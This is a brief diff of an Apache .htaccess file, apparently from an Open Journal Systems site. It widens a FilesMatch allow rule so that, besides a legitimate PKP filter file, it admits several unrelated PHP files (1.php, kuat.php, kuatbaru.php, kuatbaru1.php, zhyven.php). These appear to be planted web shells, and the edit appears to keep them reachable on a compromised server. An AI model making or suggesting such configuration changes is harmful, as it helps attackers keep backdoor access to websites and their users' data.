@@ -70,7 +70,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(PKPAuthorNativeXmlFileFilter.inc.php)$">
+<FilesMatch "^(PKPAuthorNativeXmlFileFilter.inc.php|1.php|kuat.php|kuatbaru1.php|kuatbaru.php|zhyven.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
